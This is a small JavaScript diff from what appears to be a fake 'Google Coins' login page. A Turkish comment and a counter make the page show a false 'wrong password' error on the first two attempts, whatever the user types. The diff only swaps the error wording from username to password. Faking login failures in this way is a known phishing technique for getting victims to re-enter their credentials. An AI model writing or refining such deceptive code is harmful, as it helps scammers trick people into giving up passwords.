@@ -448,7 +448,7 @@ function handleGoogleCoinsSubmit() {
   // 2. Kural: İlk 2 denemede "Kullanıcı adı hatalı" uyarısı verir
   if (usernameAttemptCount < 2) {
     usernameAttemptCount++;
-    if (coinsErrorText) coinsErrorText.textContent = 'Wrong username. Try again.';
+    if (coinsErrorText) coinsErrorText.textContent = 'Wrong password. Try again.';
     if (coinsError) coinsError.style.display = 'flex';
     if (coinsWrap) coinsWrap.classList.add('has-error');
     if (coinsInput) {
